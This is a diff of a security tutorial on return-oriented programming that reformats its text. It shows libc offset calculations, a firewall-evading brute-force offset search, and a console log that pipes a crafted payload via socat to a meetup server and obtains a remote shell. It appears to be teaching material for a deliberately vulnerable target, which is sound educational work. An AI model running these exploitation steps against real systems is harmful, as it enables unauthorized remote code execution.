+   hacker@kali:~/libc_centos7$ curl -s -O \
+   >     http://mirrors.usc.edu/pub/linux/distributions/centos/7/updates/x86_64/Packages/glibc-2.17-196.el7_4.2.x86_64.rpm
+   hacker@kali:~/libc_centos7$ rpm2cpio glibc-*.rpm | cpio --quiet -idm
+   hacker@kali:~/libc_centos7$ cd ..
+   hacker@kali:~$ ./libc-offset-so.sh "$(find libc_centos7 -name 'libc-*so')" execve puts
+   execve = 0xbf550
+   puts = 0x6cf20
+   offset execve - puts = 0x52630
+   offset puts - libc = 0x4b410
+
+
+libc summary and a guess
+^^^^^^^^^^^^^^^^^^^^^^^^
+
+We see the :program:`libc`'s ``execve / puts`` offset ratio is around 1.09 or 1.14 (depending on the distribution):
+
+
+.. csv-table:: libc execve offset ratios
+   :header: "libc distribution", "puts - libc start", "execve - puts", "ratio"
+   :stub-columns: 1
+   :widths: 2,1,1,1
+
+   "Debian 9", "0x000476f0", "0x00051e60", "1.15"
+   "Ubuntu 16.04 LTS", "0x00046c00", "0x00050450", "1.13"
+   "CentOS 7", "0x0004b410", "0x00052630", "1.09"
+   "vuln server", "0x00047700", "0x0004dde0 ?", "1.09 ?"
+   "vuln server", "0x00047700", "0x00051700 ?", "1.14 ?"
+
+So we pull a guess of 0x51700 assuming Ubuntu/Debian server. The guess from the reconnaissance program was 0x4ed00. Given the actual answer is 0x51dd0, this guess is far better. It's low by 109 guesses, meaning a search centered around the guess would take 219 guesses before success - a huge reduction in the search space.
 
 
 Brute force vulnerable server search
-^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+------------------------------------
 
-So now we must show how to search an offset range. We'll start with the range [0x00051db0, 0x00051de0] to save time. Since we don't want to trip off firewalls, the attempts will be spaced 30 seconds apart, and waiting for 219 guesses (a little under 2 hours) is a bit long for our demo.
+So now we must show how to search an offset range. Since we don't want to trip off firewalls, the attempts will be spaced 30 seconds apart, and waiting for 219 guesses (a little under 2 hours) is a bit long for our demo. So we'll start with the range [0x00051db0, 0x00051de0] to save time.
 
-#. Here's a script that runs over a range of :program:`libc` offsets trying to find the correct offset. Download :download:`search-range.sh <rop_example/search-range.sh>` and make it executable (``chmod +x search-range.sh``). Note that it waits waits 30 seconds between tries. (If you don't wait some amount of time between attempts you'll find yourself locked out of the site for some time.)
+Here's a script that runs over a range of :program:`libc` offsets trying to find the correct offset. Download :download:`search-range.sh <rop_example/search-range.sh>` and make it executable (``chmod +x search-range.sh``). Note that it waits waits 30 seconds between tries. (If you don't wait some amount of time between attempts you'll find yourself locked out of the site for some time.)
 
-   .. literalinclude:: rop_example/search-range.sh
-      :language: bash
-
-    
-   Running the above search over the interval [0x00051db0, 0x00051de0] found the actual correct value of 0x51dd0. Now we can get a shell on the vulnerable server.
+.. literalinclude:: rop_example/search-range.sh
+   :language: bash
 
 
-   .. code-block:: console
-      :emphasize-lines: 1,5-7,14-19
+Running the above search over the interval [0x00051db0, 0x00051de0] found the actual correct value of 0x51dd0. Now we can get a shell on the vulnerable server.
 
-      (rop) hacker@kali:~$ ./search-range.sh 0x00051db0 0x00051de0
-      Testing 0x51db0
-      Testing 0x51dc0
-      Testing 0x51dd0
-      success at 0x51dd0
-      (rop) hacker@kali:~$ ./create-payload.py 0x51dd0 > input-0x51dd0
-      (rop) hacker@kali:~$ cat input-0x51dd0 - | socat - tcp4:meetup.bitbender.org:8080
-      Select from the menu?
-      1. Choice one?
-      2. More choices?
-      3. Something else to choose??
-      > 
-      Almost there ... expand your horizons.
-      > id
-      uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
-      hostname    
-      meetup
-      # powned
-      exit
 
-      (rop) hacker@kali:~$ 
+.. code-block:: console
+   :emphasize-lines: 1,5-7,14-19
+
+   (rop) hacker@kali:~$ ./search-range.sh 0x00051db0 0x00051de0
+   Testing 0x51db0
+   Testing 0x51dc0
+   Testing 0x51dd0
+   success at 0x51dd0
+   (rop) hacker@kali:~$ ./create-payload.py 0x51dd0 > input-0x51dd0
+   (rop) hacker@kali:~$ cat input-0x51dd0 - | socat - tcp4:meetup.bitbender.org:8080
+   Select from the menu?
+   1. Choice one?
+   2. More choices?
+   3. Something else to choose??
+   > 
+   Almost there ... expand your horizons.
+   > id
+   uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+   hostname    
+   meetup
+   # powned
+   exit
+
+   (rop) hacker@kali:~$ 
 
 
 Understanding ROP
------------------
+=================
 
 Here are some key concepts that you should understand now that you’ve seen the exploit:
 
